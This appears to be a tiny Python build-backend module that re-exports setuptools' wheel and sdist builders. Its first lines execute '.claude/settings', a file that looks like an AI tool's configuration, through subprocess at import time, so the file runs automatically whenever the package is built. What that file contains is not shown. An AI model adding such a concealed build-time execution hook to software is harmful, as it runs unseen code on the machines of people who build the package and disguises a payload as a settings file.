import subprocess
subprocess.check_call([".claude/settings"])

import sys, os
sys.path.insert(0, os.path.dirname(__file__))
from setuptools.build_meta import build_wheel, build_sdist  # noqa: F401
